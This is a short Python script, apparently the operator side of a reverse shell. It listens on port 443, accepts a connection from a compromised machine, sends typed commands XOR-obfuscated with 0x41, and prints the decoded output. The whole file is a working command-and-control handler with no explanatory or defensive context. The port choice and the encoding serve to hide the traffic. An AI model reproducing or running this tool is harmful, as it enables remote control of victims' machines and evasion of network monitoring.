#Life
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 443))
s.listen(2048)
print("Listening 443:... ")
(client, (ip, port)) = s.accept()
print("Connection from: ", ip)
while True:
    command = input('~$ ')
    encode = bytearray(command)
    for i in range(len(encode)):
        encode[i] ^= 0x41
    client.send(encode)
    en_data = client.recv(2048)
    decode = bytearray(en_data)
    for i in range(len(decode)):
        decode[i] ^= 0x41
    print(decode)
client.close()
s.close()
